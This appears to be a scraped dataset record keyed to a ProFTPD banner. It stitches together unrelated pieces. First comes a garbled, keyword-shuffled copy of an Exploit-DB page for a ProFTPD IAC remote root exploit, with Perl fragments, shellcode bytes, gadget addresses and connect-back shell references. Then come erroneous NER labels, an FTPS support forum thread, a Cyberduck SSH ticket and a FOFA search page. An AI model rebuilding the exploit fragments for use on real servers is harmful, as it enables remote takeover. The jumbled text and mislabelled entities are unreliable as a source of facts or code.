linux_x86 linux_x86 klcp free kali linux training close search port "\ x66 port ^^ application security assessment osee advanced web attacks ($ counter =$ targets [$ ttype ][ 3 ]; db history faq search get certified proftpd iac 1 targets [$ ttype ][ 5 ]; $|= 1 code injection command injection authentication bypass high end penetration testing services targets [$ ttype ][ 2 ]; ($ a1 io :: socket :: inet -> new application security assessment osee cracking 0 ], [" suse linux sles 10 remote command execution edb targets [$ ttype ][ 0 ]); sending exploit buffer !\ n "; targets [$ ttype ][ 5 ]; 12 ], [" suse linux 9 targets [$ ttype ][ 1 ]; targets [$ ttype ][ 3 ]; provides various information security certifications split (//, gethostbyname ("$ cbip ")); 0 ], [" suse linux 11 0 ], [" suse linux 10 targets [$ ttype ][ 4 ]; "\ n "; close ($ sock ); offensive security wireless attacks term “ dork ” became shorthand fileno ($ sock ), 1 )) >= 0 && vec ($ rfd close ($ sock ); goto lbl1 information security training company exploit database × proftpd iac remote root exploit "\ n "; vec ($ rfd find mmap64 ()\ n "; exit may web application vulnerability releases 0100740e bf 00010010 mov edi work [" suse linux 11 find memcpy ()\ n "; exit work [" debian linux squeeze us faq © copyright 2019 need actionable data right away mmap64 () pack (" v ", 01007413 b9 00020000 mov ecx fileno ($ sock ), 1 offensive security certified professional memcpy () pack (" v ", "\ n "; read ($ sock 4221 edb verified close ($ sock ); printf advanced web attacks certified penetration tester enroll done .\ n "; exit typo ?\ n "; exit b9 00 02 00 00 penetration testing kali linux pack (" ii ", 1 destination pack (" v ", offensive security terms privacy offset .\ n "; exit "\ xbf ") >= 0 "\ xa4 ") >= 0 connect back :> "\ x6a online repositories like github internet search engine queries designed connect back :> "\ x31 find pop pop pop ret integer overflow server copy pack (" v ", 0xffffffff -$ mmap64 ); printf write pack (" v ", circumvent linux adress space 0xffffffff -$ memcpy ); printf pop pop pop ret located use io :: socket work [" freebsd 8 calculate mmap64 () plt entry "\ xf3 ") >= 0 exploit title binary )",# platform spec "\ xf4 ") >= 0 book google hacking "\ x10 ") >= 0 online search engines work [" debian gnu pack (" v ", work [" centos 5 building exploit buffer offset end 1029 ], kingcope type term “ googledork ” xe8 ") >= 0 linux ", 1 0100740c 8bf4 mov esi 0x10000000 rwxp address "\ x90 ($ platform eq 2 )..\ n "; netcat ?\ n "; xc3 ") >= 0 08x .\ n ", x00 ") >= 0 ($ style eq 0 xff ") >= 0 x08 ") >= 0 x04 ") >= 0 cve compliant archive google hacking database server ...\ n "; large pop ret located x5d ") >= 0 x24 ") >= 0 exploit database ", substr ($ buff remote exploit “ google problem ” x8b ") >= 0 yet equally valuable results mmap prot "\ x32 pop pop ret instructions freebsd ", 0 mmap size "\ x07 “ google hacking ” "\ n "; print substr ($ shellcode offensive security ($# argv ne 2 ghdb includes searches mmap flags "\ xff ][ 0 ]. mmap start "\ x00 0 )); #$ x proftpd iac 1 usage :\ n ". n "; exit mmap offset "\ x00 select ($ rfd linux 5 information made publicly available sock -> sockopt oscp direct submissions linux ") mmap fd "\ x00 penetration testers read ($ sock exploit style 0x0804ccd4 targets [$ x80 "; sub exploit1 shellcode copy routine feel free dos shellcode gets executed copy known assembly instructions proftpd memory space relative align 0 ], vulnerable web sites revealed database known 00 01 00 n "; print 15449 cve exploit style 0xbfbfe000 plt entry offset linux 4 “ dorks ” db exploit navigate database call mmap64 () remote box desired root shell freebsd ", freebsd ") sock "\ x00 linux technique root shell print find function entries operating system 0 pop "\ x00 pwk free linux date counter += 250 0 ]; 1 ]; search engine 0 ], special byte retn "\ x07 sub usage () printf "\ nsuccess copy "\ x00 k +$ v printf (" byte9 printf (" byte8 printf (" byte7 printf (" byte6 printf (" byte5 printf (" byte4 printf (" byte3 printf (" byte2 printf (" byte1 side request forgery retn "\ x0d origin "\ x05 often unintentional misconfiguration early talk recorded corresponding vulnerable software byte values alter lines 549 retn "\ x00 2 ]; n "; located sensitive information get certified retn "\ x08 retn "\ x04 plesk binary )", distro binary )", setreuid "\ x31 offset start 0xbfbfff00 n ", site request forgery client side use 0100740b fc cld write "\ xff offset using ida correct write value a4 ); printf ("[$ target retn "\ x03 retn "\ x02 origin "\ x03 origin "\ x02 ip "\ x66 using write offset "\ x59 ". "\ x58 ". "\ x49 ". search query retn "\ x0f retn "\ x0e public exploits plain stack smashing origin "\ x01 exploits gathered eb ff jmp community member effort 07 vulnerable app fetch process memory shellcode finder write "\ xcc platform buffer professional hacker ghdb proftpd 1 web document known good write 1021 ], x00 "; "\ x5b ". "\ x53 ". "\ x52 ". "\ x51 ". "\ x50 ". memcpy () counter ); x80 "; calculate offset 7 november 2010 3 server exploit 5 .) db note ttype x 10 address 0x10000000 1 i386 1 .) (($ v wifu mmap64 ). link exploits credentials bypass awae 3 .) "\ x00 shellcode unpack (" targets assembly instructions xf3 ". memory space binary )", "\ xff "\ x6a print "\ 4 )); "\ x31 hard work vulnerability researchers sensitive information f4 bf 080532d8 proftpd 08052938 proftpd "\ x90 memcpy ). "\ x8b a4 2 i386 2 .) process known xc3 ". google “. "\ x80 memory read x00 ". current offset valuable resource made public eb ff cracking ($ "\ xfc "\ xeb "\ xb9 "\ xb7 "\ x8d "\ x87 "\ x83 "\ x79 "\ x61 "\ x53 "\ x52 "\ x50 "\ x01 "\ r byte9 ); byte8 ); byte7 ); byte6 ); byte5 ); byte4 ); byte3 ); byte2 ); byte1 ); 0xfffff ); memcpy found xff ". x10 ". x31 ". protection read wrong write uses write x90 ". "\ xcd "\ xc0 "\ xb0 "\ x68 offset 8189 4 .) sub exploit2 sock site scripting november 2010 make use fc 8b align value a1 "\ xc7 "\ xb3 "\ x89 "\ x74 "\ x5e "\ x41 "\ x2f x66 ". x03 ". x02 ". exit x80 ". n usually sensitive reading memory proto => peeraddr => xf9 ". xef ". xcc ". xc6 ". x53 ". x52 ". x3f ". x0b ". x01 ". find pop 0 x 500 x 100 el1te x 1 v uncover interesting tcp '); subsequently followed show examples public sources program installed profit project producing different ploit technique mmap64 media attention mailing lists later used k ). johnny ’ johnny turned johnny long johnny coined initial efforts inept person get file inclusion draw attention countless hours comprehensive collection c server byte9 ). byte8 ). byte7 ). byte6 ). byte5 ). byte4 ). byte3 ). byte2 ). byte1 ). began cataloging 7 .) 6 .) 3a server 3 2e server 17_i386 !! 11 10 0804ccd4 psa xcd ". xc0 ". xb0 ". x68 ". ret counter () xe3 ". xe1 ". xd2 ". xc9 ". x7f ". x6e ". x54 ". x43 ". kcoperulezkcoperulezkc ". kingcope 2010 actually jump “ work public service proftpd pop3ret ). never meant lbl1 largepopret ). defcon 13 course required concepts rather cbip categorized index == 0xffff <$ numtargets 12 01007418 f3 memcpy 2 printf located copy 0x10000100 jump information xf4 us queries internet add esp ); x00 read write style instructions xff x6a x10 x08 x04 usage address x31 print 4 x90 x5d x24 use relative netcat fd exploit1 buff available argv 08x x8b using memory x66 x03 x02 ". x80 x xcc x5b x53 x52 x51 x50 x0f x0e x01 target stack k good community byte9 byte8 byte7 byte6 byte5 byte4 byte3 byte2 byte1 app align 7 2010 0xbfbfff00 0xbfbfe000 xcd xc0 xb0 x68 kingcope jump xe3 xe1 xd2 xc9 xc7 xb3 x89 x7f x74 x6e x5e x54 x43 x41 x2f values service rather pop3ret numtargets meant largepopret kcoperulezkcoperulezkc index found f3 exploit2 esp date course c add 8189 3a 2e 13 0xffff 0x10000100 }} xxe xss xe4 xdb xc4 xc2 xbc xb2 xa5 xa1 x9f x7e x7c x73 x69 x62 x5f x5a x56 x55 x46 x45 x44 x3b x39 x20 x1c x06 written write_offset well user undef ubunutu uaf today timeout time talks tags subject ssrf sqli source so_linger sid setup serve seeking seek rootshell rfi return retrieve result repository refer randomization provided proremote proof proftpd_1 present pp popularized popularised pl perimeter part padding number non needed nearly msfu msf map making maintained lnxcbsc linked libc lfi length issues indexed included id given freely foolish following fetches factors fact extension exploitation execute else easy e due documented developed denial decade debian5 ctp csrf cross crawled could copied construct confirmed check chances cb cases bytes build95100504 bsdcbsc bing bighawk become basic_1 barrage amplified aim advisory advisories addr1 ab a3 a2 [".$ 563 4_i386 4101 37 31 2a 20h 200 20 18 17 16 15 10000100 0xff 0x080532d8 0x08052830 0x0804d23c 0x0804cce0 0x0804ccbc 0x0804cbbc 0x0804caa8 0x0804ca2c 0x0804c9c4 0x0804c9a4 0x0804c290 0x0804a85c 0x0804a234 ."]\ ++)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+NER Predictions: 
+{
+  "vendors": [
+    "arm",
+    "cgi"
+  ],
+  "device_types": [],
+  "products": [
+    "sh4",
+    "crisv32",
+    "x86",
+    "x86",
+    "plan9",
+    "x86",
+    "x86",
+    "tru64",
+    "x86",
+    "pwn2own",
+    "x86",
+    "x86",
+    "x86",
+    "a4",
+    "x86",
+    "x66",
+    "a1",
+    "lbl1",
+    "mmap64",
+    "b9",
+    "xa4",
+    "x6a",
+    "x31",
+    "xf3",
+    "xf4",
+    "x10",
+    "xe8",
+    "bf4",
+    "x10000000",
+    "x90",
+    "xc3",
+    "x00",
+    "x08",
+    "x04",
+    "x5d",
+    "x24",
+    "x8b",
+    "x32",
+    "x07",
+    "x0804ccd4",
+    "x80",
+    "exploit1",
+    "xbfbfe000",
+    "byte9",
+    "byte8",
+    "byte7",
+    "byte6",
+    "byte5",
+    "byte4",
+    "byte3",
+    "byte2",
+    "byte1",
+    "x0d",
+    "x05",
+    "xbfbfff00",
+    "x03",
+    "x02",
+    "x59",
+    "x58",
+    "x49",
+    "x0f",
+    "x0e",
+    "x01",
+    "x5b",
+    "x53",
+    "x52",
+    "x51",
+    "x50",
+    "i386",
+    "f4",
+    "d8",
+    "xb9",
+    "xb7",
+    "x8d",
+    "x87",
+    "x83",
+    "x79",
+    "x61",
+    "xc0",
+    "xb0",
+    "x68",
+    "exploit2",
+    "xc7",
+    "xb3",
+    "x89",
+    "x74",
+    "x5e",
+    "x41",
+    "x2f",
+    "xf9",
+    "xc6",
+    "x3f",
+    "x0b",
+    "el1te",
+    "i386",
+    "ccd4",
+    "xe3",
+    "xe1",
+    "xd2",
+    "xc9",
+    "x7f",
+    "x6e",
+    "x54",
+    "x43",
+    "pop3ret",
+    "f3",
+    "x10000100",
+    "xe4",
+    "xc4",
+    "xc2",
+    "xb2",
+    "xa5",
+    "xa1",
+    "x9f",
+    "x7e",
+    "x7c",
+    "x73",
+    "x69",
+    "x62",
+    "x5f",
+    "x5a",
+    "x56",
+    "x55",
+    "x46",
+    "x45",
+    "x44",
+    "x3b",
+    "x39",
+    "x20",
+    "x1c",
+    "x06",
+    "debian5",
+    "build95100504",
+    "addr1",
+    "a3",
+    "a2",
+    "i386",
+    "x080532d8",
+    "x08052830",
+    "x0804d23c",
+    "x0804cce0",
+    "x0804ccbc",
+    "x0804cbbc",
+    "x0804caa8",
+    "x0804ca2c",
+    "x0804c9c4",
+    "x0804c9a4",
+    "x0804c290",
+    "x0804a85c",
+    "x0804a234"
+  ]
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Local Dependencies: 
+[]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Raw Data: 
+220 NASFTPD Turbo station 1.3.5a Server (ProFTPD)
+Refined:  220 nasftpd turbo station 1 5a server proftpd
+
+============================https://www.smartftp.com/static/forums/39/16872/ftps-explicit-not-working/===============================
+
+FTPS Explicit not working - SmartFTP Forums
+SmartFTP Home » SmartFTP Forums » Premium Support
+FTPS Explicit not working
+biltong
+2010-03-29 14:06:42
+Hi,
+I have setup FTPS Explicit access to my business NAS behind a Linksys WRT54GS router and using a DYNDNS domain. When I tested it, admittedly on my LAN,it worked fine but now I'm away from the office for 2 weeks and tried it, it does not work.
+FTP works fine but obviously can't be used instead because it is insecure.
+I think it is because I setup Port Fowarding on the router only for port 21, not knowing exactly what I was doing. I now realise that FTPS uses port 21 and port 22 and this is probably why it doesn't work via WAN.
+I don't have remote access to my router so cannot change it.
+I'm mainly concerned about encrypting the username and password when establishing the connection and not worried about encrypting file transfer. Is there any way I can configure SmartFTP to do this / any other way I can overcome this problem?
+Thanks.
+Here's my SmartFTP log:
+[14:58:01] SmartFTP v4.0.1091.0
+[14:58:01] Resolving host name "xxxxxxxxx.dyndns.xxx"
+[14:58:01] Connecting to xx.7.19.xxx Port: 21
+[14:58:01] Connected to xxxxxxxxx.dyndns.xxx.
+[14:58:05] 220 NASFTPD Turbo station 2.x 1.3.1rc2 Server (ProFTPD) [192.168.1.xx]
+[14:58:05] AUTH TLS
+[14:58:06] 234 AUTH TLS successful
+[14:58:06] Connected. Exchanging encryption keys...
+[14:58:06] Key Exchange: 2048 bit RSA
+[14:58:06] Session Cipher: 128 bit AES
+[14:58:06] TLS 1.0 encrypted session established.
+[14:58:06] Command channel protection set to Private.
+[14:58:06] PBSZ 0
+[14:58:06] 200 PBSZ 0 successful
+[14:58:06] USER xxxxxxxx
+[14:58:07] 331 Password required for xxxxxxxx
+[14:58:07] PASS (hidden)
+[14:58:07] 230 User xxxxxxxx logged in
+[14:58:07] SYST
+[14:58:07] 215 UNIX Type: L8
+[14:58:07] Detected Server Type: UNIX
+[14:58:07] RTT: 247.259 ms
+[14:58:07] FEAT
+[14:58:08] 211-Features:
+[14:58:08]
+LANG en
+[14:58:08]
+MDTM
+[14:58:08]
+UTF8
+[14:58:08]
+AUTH TLS
+[14:58:08]
+PBSZ
+[14:58:08]
+PROT
+[14:58:08]
+REST STREAM
+[14:58:08]
+SIZE
+[14:58:08] 211 End
+[14:58:08] OPTS UTF8 ON
+[14:58:08] 451 Unable to accept OPTS UTF8
+[14:58:08] Detected Server Software: ProFTPD
+[14:58:08] PWD
+[14:58:08] 257 "/" is the current directory
+[14:58:08] TYPE A
+[14:58:08] 200 Type set to A
+[14:58:08] PROT P
+[14:58:09] 200 Protection set to Private
+[14:58:09] PASV
+[14:58:09] 227 Entering Passive Mode (192,168,1,xx,218,94).
+[14:58:09] Passive ip address returned from server different from server ip.
+[14:58:09] Opening data connection to 192.168.1.xx Port: 55902
+[14:58:09] LIST -aL
+[14:58:30] A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond.
+mb
+2010-03-29 14:52:48
+Go to the Favorite Properties. Then go to the FTP->Connection->SSL/TLS dialog and set the File Transfer option to "Clear".
+biltong
+2010-03-29 15:46:08
+Go to the Favorite Properties. Then go to the FTP->Connection->SSL/TLS dialog and set the File Transfer option to "Clear".
+This didn't work. The problem is that the server is returning a local ip address, which obviously the client can't see. This, I know, is a problem with my NAS server FTP settings, which I will have to resolve on return to the office but can't do anything about whilst away for 2 weeks.
+So I was wondering whether there was another protocal/setup along the lines of FTP but which secures the transmission of username and password......
+mb
+2010-03-29 18:43:40
+If you think this is the problem, go to the Favorite Properties. Then go to the FTP->Connection dialog and set the Force Passive IP option to enable.
+biltong
+2010-03-30 14:45:21
+If you think this is the problem, go to the Favorite Properties. Then go to the FTP->Connection dialog and set the Force Passive IP option to enable.
+Almost there I think however the server is returning a port number that I think the router doesn't allow. Is there any way I can force the data connection onto port 21? Here's my log:
+[15:29:02] SmartFTP v4.0.1091.0
+[15:29:02] Resolving host name "xxxxxxxxxxx.dyndns.xxx"
+[15:29:02] Connecting to 80.7.19.xxx Port: 21
+[15:29:02] Connected to xxxxxxxxxxx.dyndns.xxx.
+[15:29:03] 220 NASFTPD Turbo station 2.x 1.3.1rc2 Server (ProFTPD) [192.168.1.xx]
+[15:29:03] AUTH TLS
+[15:29:03] 234 AUTH TLS successful
+[15:29:03] Connected. Exchanging encryption keys...
+[15:29:03] Key Exchange: 2048 bit RSA
+[15:29:03] Session Cipher: 128 bit AES
+[15:29:03] TLS 1.0 encrypted session established.
+[15:29:03] Command channel protection set to Private.
+[15:29:03] PBSZ 0
+[15:29:04] 200 PBSZ 0 successful
+[15:29:04] USER xxxxxxxx
+[15:29:04] 331 Password required for xxxxxxxx
+[15:29:04] PASS (hidden)
+[15:29:05] 230 User xxxxxxxx logged in
+[15:29:05] SYST
+[15:29:05] 215 UNIX Type: L8
+[15:29:05] Detected Server Type: UNIX
+[15:29:05] RTT: 206.863 ms
+[15:29:05] FEAT
+[15:29:05] 211-Features:
+[15:29:05]
+LANG en
+[15:29:05]
+MDTM
+[15:29:05]
+UTF8
+[15:29:05]
+AUTH TLS
+[15:29:05]
+PBSZ
+[15:29:05]
+PROT
+[15:29:05]
+REST STREAM
+[15:29:05]
+SIZE
+[15:29:05] 211 End
+[15:29:05] OPTS UTF8 ON
+[15:29:05] 451 Unable to accept OPTS UTF8
+[15:29:05] Detected Server Software: ProFTPD
+[15:29:05] PWD
+[15:29:06] 257 "/" is the current directory
+[15:29:06] TYPE A
+[15:29:06] 200 Type set to A
+[15:29:06] PROT C
+[15:29:06] 200 Protection set to Clear
+[15:29:06] PASV
+[15:29:06] 227 Entering Passive Mode (192,168,1,xx,217,226).
+[15:29:06] Passive ip address returned from server different from server ip.
+[15:29:06] Replacing received PASV address 192.168.1.xx by server address 80.7.19.xxx.
+[15:29:06] Opening data connection to 80.7.19.xxx Port: 55778
+[15:29:06] LIST -aL
+[15:29:27] A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond.
+[15:30:27] Timeout (60s).
+mb
+2010-03-30 16:48:19
+Go to the Favorite Properties. Then to the FTP->Connection->SSL/TLS page and set the control connection to Clear. As a result SmartFTP sends a CCC command after the login.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Refined Data: 
+220 NASFTPD Turbo station 1.3.5a Server (ProFTPD)
+Refined:  220 nasftpd turbo station 1 5a server proftpd
+
+============================https://www.smartftp.com/static/forums/39/16872/ftps-explicit-not-working/===============================
+
+ smartftp forums smartftp home » smartftp forums » premium support ftps explicit 220 nasftpd turbo station 2 ftp -> connection -> ssl replacing received pasv address 192 data connection onto port 21 setup ftps explicit access exchanging encryption keys ... 227 entering passive mode ftps uses port 21 passive ip address returned ftp -> connection dialog nas server ftp settings 234 auth tls successful 230 user xxxxxxxx logged force passive ip option command channel protection set 0 encrypted session established result smartftp sends 200 pbsz 0 successful password ...... mb 2010 ftps explicit opening data connection local ip address 200 protection set file transfer option business nas behind established connection failed 2048 bit rsa 128 bit aes ftp works fine setup port fowarding 331 password required connection attempt failed 200 type set resolving host name detected server software smartftp v4 configure smartftp server address 80 work via wan linksys wrt54gs router encrypting file transfer detected server type smartftp log accept opts utf8 215 unix type working biltong 2010 server ip port 21 mb 2010 2 weeks tls dialog auth tls user xxxxxxxx control connection biltong 2010 pbsz 0 setup along session cipher remote access ccc command port number port 22 worked fine server different opts utf8 1rc2 server tls page xxx port xx port connected host tls 1 wondering whether used instead rest stream mainly concerned lang en knowing exactly key exchange favorite properties current directory cannot change another protocal 94 ). 863 ms 60s ). 451 unable 42 hi 259 ms 257 "/" 226 ). 29 18 x 1 prot p prot c connected party 30 16 whilst away think however properly respond dyndns domain clear ". 211 end 29 14 ftp 30 14 connection 48 go 29 15 19 go 08 go pasv 21 192 set 0 password type server force xxxxxxxx pbsz failed working work utf8 unix router encrypting 80 go 29 prot connected 30 14 1 xxx xx think respond log dyndns clear away 48 211 19 15 08 xxxxxxxxxxx xxxxxxxxx worried way using username tried transmission timeout time thanks tested syst size see secures rtt returning return resolve realise pwd proftpd problem probably private period pass overcome office obviously mdtm login list lines lan l8 know insecure hidden features feat establishing enable connecting client anything almost allow al admittedly 7 58 55902 55778 52 46 45 43 40 3 27 247 218 217 206 168 1091 09 07 06 05 04 03 02 01
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+NER Predictions: 
+{
+  "vendors": [],
+  "device_types": [
+    "router"
+  ],
+  "products": [
+    "v4",
+    "wrt54gs",
+    "utf8",
+    "rc2",
+    "l8"
+  ]
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Local Dependencies: 
+[]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Raw Data: 
+220 NASFTPD Turbo station 1.3.5a Server (ProFTPD)
+Refined:  220 nasftpd turbo station 1 5a server proftpd
+
+============================https://trac.cyberduck.io/ticket/6361===============================
+
+#6361 ("Unknown host key" warning even though "Always" is chosen)
+– Cyberduck
+Toggle navigation
+Changelog Cryptomator
+Blog
+Development
+Help
+Protocols
+FTP SFTP WebDAV Amazon S3 Google Storage OpenStack Swift Microsoft Azure
+Microsoft OneDrive Dropbox Google Drive
+Backblaze B2 Joyent Triton DRACOON
+Spectra BlackPearl iRODS
+Local Filesystem
+Download
+Donate
+Cyberduck
+Mountain Duck
+CLI
+Cyberduck
+Search:
+LoginPreferencesAbout TracRegister
+WikiTimelineRoadmapBrowse SourceView TicketsSearch
+Context Navigation
+← Previous TicketNext Ticket →
+Opened on Nov 11, 2011 at 10:46:00 PM
+Closed on Jun 12, 2012 at 4:19:50 PM
+Last modified on Mar 22, 2013 at 10:26:58 AM
+#6361
+closed
+defect
+(worksforme)
+"Unknown host key" warning even though "Always" is chosen
+Reported by:
+cyperpopyber
+Owned by:
+dkocher
+Priority:
+high
+Milestone:
+Component:
+sftp
+Version:
+4.2.1
+Severity:
+normal
+Keywords:
+Cc:
+Daps0l
+Architecture:
+Intel
+Platform:
+Mac OS X 10.7
+Description
+(last modified by dkocher)
+hi,
+i'm having the same problem as here #1671, but deleting the known_hosts did not help.
+further more, i see, that with every "yes, store the key forever" klick, the key of the ftp server is added known_hosts again.
+so i have a known_hosts with a lot of identical entries now.
+any suggestions?
+those are the only errors i see in the console:
+11.11.11 22:44:48,081 Cyberduck: Error loading /Users/user/Library/Contextual Menu Items/Disk Inventory X Finder CM.plugin/Contents/MacOS/Disk Inventory X Finder CM:
+dlopen(/Users/user/Library/Contextual Menu Items/Disk Inventory X Finder CM.plugin/Contents/MacOS/Disk Inventory X Finder CM, 262): no suitable image found.
+Did find:
+/Users/user/Library/Contextual Menu Items/Disk Inventory X Finder CM.plugin/Contents/MacOS/Disk Inventory X Finder CM: mach-o, but wrong architecture
+11.11.11 22:44:48,081 Cyberduck: Cannot find function pointer AbstractCMPluginFactory for factory 29E65FF2-4AAE-11D9-A8A3-000393B64A0C in CFBundle/CFPlugIn 0x1ac090 </Users/user/Library/Contextual Menu Items/Disk Inventory X Finder CM.plugin> (bundle, not loaded)
+i'm running lion 10.7.2 and cyberduck Version 4.1.3 (9045)
+i remember, having this "trouble" with snow leopard too. that was an earlier version of cyberduck.
+the ftp-server shows: 220 NASFTPD Turbo station 2.x 1.3.2e Server (ProFTPD)
+(its a qnap nas)
+Oldest first
+Newest first
+Threaded
+Comments only
+Change History (12)
+comment:1
+Changed on Nov 13, 2011 at 1:39:36 PM by dkocher
+Component
+changed from core to sftp
+Description
+modified (diff)
+Owner
+set to dkocher
+comment:2
+Changed on Nov 13, 2011 at 1:42:30 PM by dkocher
+Summary
+changed from me too: "Unknown host key" warning every time for SFTP, even though "Always" is chosen to "Unknown host key" warning even though "Always" is chosen
+comment:3
+Changed on Nov 15, 2011 at 8:56:22 PM by dkocher
+Can you login to a guest account in OS X and test if you get the same trouble.
+comment:4
+Changed on Nov 16, 2011 at 9:42:43 PM by dkocher
+Resolution
+set to worksforme
+Status
+changed from new to closed
+comment:5
+follow-up:
+↓ 6
+Changed on Nov 20, 2011 at 6:49:03 PM by cyperpopyber
+Thanks for the hint.
+"Works for me" too.
+Now I have to fiddle out, whats the problem on *my* Systems.
+Cheers,
+comment:6
+in reply to:
+↑ 5
+Changed on Nov 20, 2011 at 10:03:53 PM by dkocher
+Replying to cyperpopyber:
+Thanks for the hint.
+"Works for me" too.
+Now I have to fiddle out, whats the problem on *my* Systems.
+Cheers,
+Please reopen the ticket if you can provide more information. I actively close tickets that miss a timely response as it is unlikely to find a resolution then. In this case I just have no idea what might be going on and can only do wild guesses not much educated. We have to narrow down the possible causes and the first step is to try it with another account.
+comment:7
+Changed on Apr 3, 2012 at 10:20:44 AM by Daps0l
+Cc
+Daps0l added
+Resolution
+worksforme deleted
+Status
+changed from closed to reopened
+Version
+changed from 4.1.3 to 4.2.1
+Hello, i have exactly the same problem;
+The problem seems to occur when the SSH server is running on a non-default port. For example my SSH server is running on port 11111 instead of 22.
+Steps to reproduce:
+Delete ~/.ssh/known_hosts
+Connect to mypc.homeip.net:11111
+Unknown host key -> check 'always' -> allow
+1 line added to ~/.ssh/known_hosts
+Disconnect
+Connect to mypc.homeip.net:11111
+Unknown host key -> check 'always' -> allow
+1 line added to ~/.ssh/known_hosts (total = 2 lines now)
+Disconnect
+This continues forever, always adding another new line to the known_hosts.
+So my guess is the problem probably has got something to do with the hashing of:
+[mypc.homeip.net]:11111 ssh-rsa <hostkey>
+for hosts with non default ports, versus:
+mypc.homeip.net ssh-rsa <hostkey>
+for default ports.
+comment:8
+Changed on Apr 3, 2012 at 12:39:46 PM by dkocher
+Milestone
+set to 4.3
+Status
+changed from reopened to new
+comment:9
+Changed on Apr 3, 2012 at 12:43:55 PM by dkocher
+We do not take the server port number into account when verifying or adding keys, though.
+comment:10
+Changed on Apr 4, 2012 at 9:33:40 AM by dkocher
+Added test in r9502.
+comment:11
+Changed on Jun 12, 2012 at 4:19:50 PM by dkocher
+Resolution
+set to worksforme
+Status
+changed from new to closed
+I have tested here with running OpenSSH on port 222 on localhost with an empty known_hosts but cannot reproduce.
+comment:12
+Changed on Mar 22, 2013 at 10:26:58 AM by dkocher
+Milestone
+4.4 deleted
+Note: See
+TracTickets for help on using
+tickets.
+Download in other formats:
+Comma-delimited Text
+Tab-delimited Text
+RSS Feed
+Powered by Trac 1.0.4
+By Edgewall Software.
+Visit the Trac open source project athttp://trac.edgewall.org/
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Refined Data: 
+220 NASFTPD Turbo station 1.3.5a Server (ProFTPD)
+Refined:  220 nasftpd turbo station 1 5a server proftpd
+
+============================https://trac.cyberduck.io/ticket/6361===============================
+
+ – cyberduck toggle navigation changelog cryptomator blog development help protocols ftp sftp webdav amazon s3 google storage openstack swift microsoft azure microsoft onedrive dropbox google drive backblaze b2 joyent triton dracoon spectra blackpearl irods local filesystem download donate cyberduck mountain duck cli cyberduck search loginpreferencesabout tracregister wikitimelineroadmapbrowse sourceview ticketssearch context navigation ← previous ticketnext ticket → opened trac open source project athttp :// trac daps0l cc daps0l added resolution worksforme deleted status changed oldest first newest first threaded comments 11111 unknown host key -> check cyberduck version 4 081 cyberduck disk inventory x finder cm delimited text rss feed powered cyberduck -> allow 1 line added help download 220 nasftpd turbo station 2 6361 (" unknown host key cannot find function pointer abstractcmpluginfactory sftp description modified ftp server always adding another new line ftp sftp version net ]: 11111 ssh mac os x 10 unknown host key sftp worksforme status changed 4 deleted note 50 pm last modified delimited text tab port 11111 instead 3 status changed dkocher resolution set dkocher added test 6361 closed defect daps0l architecture suitable image found contextual menu items actively close tickets ↑ 5 changed dkocher summary changed delete ~/. ssh warning every time dlopen (/ users dkocher milestone set ↓ 6 changed server port number trac 1 00 pm closed wrong architecture 11 warning even though running lion 10 dkocher milestone 4 reopened version changed dkocher component changed ticket non default ports added known_hosts first step known_hosts disconnect connect os x last modified x 1 adding keys key forever 2 changed 10 changed 50 pm another account 4 changed ~/. ssh 1 changed cc cannot reproduce net ssh default ports default port ssh server 3 changed 11 changed owner set high milestone using tickets port 222 known_hosts connect even though earlier version dkocher replying dkocher priority 5 follow 2 lines new comment 7 changed 12 changed apr 4 worksforme resolution dkocher comment 1 severity 1 hello 9 changed 8 changed 55 pm 53 pm 36 pm 30 pm server shows 2e server 7 description closed comment 22 pm wild guesses timely response snow leopard running openssh qnap nas possible causes please reopen nov 16 nov 15 nov 13 nov 11 normal keywords much educated intel platform identical entries got something factory 29e65ff2 error loading empty known_hosts continues forever change history cfplugin 0x1ac090 apr 3 262 ): 46 pm 43 pm 03 pm mar 22 11 22 problem seems problem probably jun 12 guest account cyperpopyber owned chosen reported see tractickets nov 20 edgewall software chosen comment key cyperpopyber thanks find always new dkocher 2 10 net 4 1 closed users though test running reopened non known_hosts every disconnect component 6 3 11 comment 22 problem cyperpopyber chosen account 7 12 thanks see reproduce edgewall 9 8 46 43 20 03 yes works whats visit versus verifying user unlikely try trouble total tested take systems suggestions store steps rsa reply remember r9502 provide proftpd plugin org occur narrow mypc miss might macos mach lot login localhost loaded library klick information idea hosts homeip hint hi hashing guess going get formats fiddle example exactly errors diff deleting core contents console comma cheers cfbundle case bundle a8a3 9045 58 56 4aae 49 48 44 42 40 39 33 26 2013 2012 2011 19 1671 11d9 000393b64a0c 0
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+NER Predictions: 
+{
+  "vendors": [
+    "microsoft",
+    "intel",
+    "openstack"
+  ],
+  "device_types": [],
+  "products": [
+    "s3",
+    "b2",
+    "daps0l",
+    "e65ff2",
+    "x1ac090",
+    "r9502",
+    "a8a3",
+    "d9",
+    "b64a0c"
+  ]
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Local Dependencies: 
+[]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Raw Data: 
+220 NASFTPD Turbo station 1.3.5a Server (ProFTPD)
+Refined:  220 nasftpd turbo station 1 5a server proftpd
+
+============================https://fofa.so/result?qbase64=aXA9Ijk1LjEyOC4xNDguMzAi===============================
+
+FOFA Pro - 搜索结果
+问题反馈
+问题反馈关闭
+请详细描述您要反馈的内容
+请留下您的手机号或邮箱，方便我们与您联系(选填)
+验证码
+提交
+规则专题
+API&SDK
+规则列表
+Fofa客户端
+VIP会员
+切换导航
+规则列表
+规则专题
+企业版
+API&SDK
+客户端
+VIP会员
++1积分
+登录与注册
+×Close
+升级到普通会员以上级别用户就可以使用API了。
